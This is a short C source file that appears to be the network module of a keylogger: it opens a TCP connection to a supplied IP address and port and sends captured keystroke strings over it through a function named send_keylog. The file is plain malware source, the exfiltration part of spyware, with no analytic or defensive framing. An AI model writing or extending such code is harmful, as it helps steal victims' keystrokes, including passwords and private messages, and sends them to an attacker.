#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "send_keylog.h"

int create_conn(char* ip, int port) {
    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("Failed to create socket\n");
        exit(1);
    }

    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("Connection failed\n");
        exit(1);
    }

    return sock;
}

void send_keylog(int sock, char* key) {
    if (send(sock, key, strlen(key), 0) < 0) {
        printf("Failed to send keylog\n");
        exit(1);
    }
}

void close_socket(int sock) {
    close(sock);
}

